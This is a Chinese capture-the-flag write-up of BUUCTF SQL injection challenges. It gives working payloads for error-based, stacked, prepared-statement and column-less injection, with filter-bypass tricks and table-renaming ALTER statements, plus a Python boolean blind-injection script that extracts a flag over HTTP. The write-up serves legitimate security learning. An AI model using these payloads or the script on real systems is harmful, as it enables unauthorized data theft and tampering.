---
title: BUUCTF_SQL注入类
date: 2022-02-04 22:52:49
updated: 2022-02-04 22:52:49
tags: [sql注入]
categories: BUUCTF
toc: true
---
BUUCTF中和SQL注入有关的题目
<!-- more -->


## 一、HardSQL

### 知识点：报错注入

tips：在发现空格，=号，union关键词被强屏蔽了后，可以尝试**报错注入**

绕过技巧可以看sql总结

这也是头一次尝试用报错注入解题

`0x7e`就是`~`,方便观看

直接上解题步骤：

### 1.爆表

```sql
?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database())))),1))%23
```

![](https://i.loli.net/2021/11/01/bq1U5zjRFNfoalv.png)

### 2.爆字段

```mysql
?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))),1))%23
```

![](https://i.loli.net/2021/11/01/V2wEyP9SUaZrmdh.png)

### 3.查看字符

```mysql
?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(`H4rDsq1`))),1))%23
```

发现只显示了一半：

![](https://i.loli.net/2021/11/01/lAjSBvyNmOtg2f5.png)



### 知识点：extractvalue和updatexml`只显示32位字符`

使用`right()`显示右边，查看右数20位，对应拼接即可

```mysql
?username=1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,20)))from(`H4rDsq1`))),1))%23
```

![](https://i.loli.net/2021/11/01/QbZmfCXhKPOuSwq.png)





## 二、布尔盲注脚本（几道题）

```python
import requests
import time
url = 'http://a022b5ef-56ff-4edc-9d4b-8b60dcd0f7ee.node4.buuoj.cn:81/index.php'
p1 = "if(ascii(substr((select(database())),{},1))>{},1,0)"
p2 = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{},1))>{})^1"
p3 = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))>{})^1"
p4 = "1^(ascii(substr((select(flag)from(flag)),{},1))>{})^1"
flag =""
for i in range(1,10000):
    l = 32
    r = 128
    mid = (l+r)//2
    while(l<r):
        payload = p4.format(i,mid)
        data = {
            "id":payload
        }
        res = requests.post(url,data=data).text
        if "Hello" in res:
            l = mid + 1
        else:
            r = mid
        mid = (l+r) // 2
    if(mid==32 or mid ==132):
        break
    flag +=chr(mid)
    print(flag)
    time.sleep(0.1)
print(flag)
```

用`if(xxx,0,1)` 或者 `1^(xxx)^1`都行





## 三、随便注

简单尝试后，发现是字符型注入，字段为2

![](https://i.loli.net/2021/10/26/y2JicgBbwfUoXNP.png)

尝试使用union注入，发现被过滤，尝试后发现，**无法绕过`select`的过滤**

![](https://i.loli.net/2021/10/26/kuz2Knlv9p4ydcm.png)



### 堆叠注入

![](https://i.loli.net/2021/10/26/rbRhOigd5NMSkzA.png)

可以用`desc table_name`查看表结构的详细信息，或者`show columns from table_name`

![](https://i.loli.net/2021/10/26/FlWh7pZqiymA5X6.png)

可以看出，flag就在这张表中，但没有select无法获取字段具体信息

看了全网的题解，大概有三种思路，收获颇多



### 1.handler查询

> mysql除可使用select查询表中的数据，也可使用handler语句，**这条语句使我们能够一行一行的浏览一个表中的数据**
>
> 不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。
> HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。

<font color='red'>注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</font>

基本使用方法：

```mysql
handler table_name open      #打开一张表
handler table_name read first #读取第一行内容，
handler table_name read next  #依次获取其它行
```

尝试使用一下payload:

```mysql
?inject=-1';handler `1919810931114514` open;handler `1919810931114514` read first;--+
```

![](https://i.loli.net/2021/10/26/gUnRzEwQVMcBlhe.png)

### 2.预处理语句

```mysql
PREPARE name from '[my sql sequece]';  #预定义SQL语句
EXECUTE name; #执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  #删除预定义SQL语句
```

<font color='red'>也可以通过变量进行传递</font>

```mysql
SET @t = 'hahaha';  #存储表名
SET @sql = concat('select * from ', @t);  #存储SQL语句
PREPARE name from @sql;   #预定义SQL语句
EXECUTE name;  #执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  #删除预定义SQL语句
```

此时进行查询的话，又有几个思路

(1)将select * from \`1919810931114514\`转换为16进制

```mysql
1';prepare aaa from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460 ;execute aaa; --+
```

(2)使用concat函数拼接

```mysql
1';prepare aaa from concat('selec' , 't',' * from `1919810931114514` '); execute aaa; --+
```

(3)可以考虑用char函数将过滤词转为ascii

```mysql
1';PREPARE aaa from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE aaa;#
```

![](https://i.loli.net/2021/10/26/2oIUtOf8jGszqHm.png)

### 3.重命名

发现正常的查找是在`words`表中，通过id进行查找。

所以可以利用堆叠注入来改变表名从而实现查看flag

```mysql
1'; alter table words rename to aaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(60);--+
```

详解：

alter table words rename to aaa; 										先把原来的words表名字改成aaa
alter table \`1919810931114514\` rename to words; 	   将表1919810931114514的名字改为words
alter table words change flag id varchar(60);                      将改完名字后的表中的flag改为id，字符串尽量长点吧

再用`1' or 1=1 --+`爆出表段

![](https://i.loli.net/2021/10/27/4B7lA5UoSVjnwXk.png)

## 四、[SWPU2019]Web1

#### 知识点：MariaDB的SQL注入、无列名注入

https://mariadb.com/kb/en/mysqlinnodb_table_stats/
`mysql.innodb_table_stats`用于报表名
`select group_concat(table_name) from mysql.innodb_table_stats`

![](https://s2.loli.net/2022/02/19/kYVTxhiwjfyEeHA.png)

注册账号登录，申请广告名为`1'`，发现有sql报错，应该是sql注入。(可能也有xss)

发布广告名时过滤了or/order/information/空格/--+/#等关键字，先尝试用union注入找到列数.

```sql
爆列数：-1'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
或者：-1'/**/group/**/by/**/23,'5报错而-1'/**/group/**/by/**/22,'5正常
```

发现总列数为22，且2/3列可以回显。查看用户名和数据库类型为MariaDB

因为过滤了information_schema，此处看wp发现可以使用mysql.innodb_table_stats或者sys.schema_auto_increment_columns(不一定有)

<img src="https://s2.loli.net/2022/02/19/pILgUVYNq8eD7cR.png" style="zoom: 67%;" />

```
查询表名：-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

爆出表名ads、users-->猜测尝试在users-->**再测出users的列数为3**-->使用无列名注入方式：

可参考：https://www.jianshu.com/p/dc9af4ca2d06、https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/

```
1'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
或者直接全查：
1'/**/union/**/select/**/1,(select/**/group_concat(a,b,c)/**/from(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
```

最后尝试`3 as a`可以爆出flag。

![](https://s2.loli.net/2022/02/19/zyRg96otXPHlnjU.png)

